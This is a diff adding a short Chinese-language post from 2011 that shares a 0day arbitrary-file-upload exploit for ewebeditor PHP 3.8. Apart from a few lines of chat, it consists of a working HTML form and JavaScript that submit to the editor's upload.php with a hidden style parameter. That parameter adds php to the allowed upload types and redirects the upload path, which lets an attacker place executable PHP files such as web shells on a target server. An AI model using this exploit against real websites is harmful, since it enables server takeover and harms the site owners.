@@ -1,0 +1,23 @@
+ewebeditor PHP 3.8版本上传任意文件0day2011-08-02 20:27PHP版本的ewebeditor用的比ASP版本的少的多吧，俺是非常少碰到。貌似
+
+听说国外用的非常多。台湾人喜欢用？用的着的关注一下吧。
+
+EXP如下：
+
+<form action="" method=post enctype="multipart/form-data"> 
+<INPUT TYPE="hidden" name="MAX_FILE_SIZE" value="512000"> 
+URL:<input type=text name=url value="http://www.xxx.com/ewebeditor/" size=100><br> 
+<INPUT TYPE="hidden" name="aStyle[12]" value="toby57|||gray|||red|||../uploadfile/|||550|||350|||php|||swf|||gif|jpg|jpeg|bmp|||rm|mp3|wav|mid|midi|ra|avi|mpg|mpeg|asf|asx|wma|mov|||gif|jpg|jpeg|bmp|||500|||100|||100|||100|||100|||1|||1|||EDIT|||1|||0|||0|||||||||1|||0|||Office|||1|||zh-cn|||0|||500|||300|||0|||...|||FF0000|||12|||宋体||||||0|||jpg|jpeg|||300|||FFFFFF|||1"> 
+file:<input type=file name="uploadfile"><br> 
+<input type=button value=submit onclick=fsubmit()> 
+</form><br> 
+<script> 
+function fsubmit(){ 
+form = document.forms[0]; 
+form.action = form.url.value+'php/upload.php?action=save&type=FILE&style=toby57&language=en'; 
+alert(form.action); 
+form.submit(); 
+} 
+</script>
+ 
+
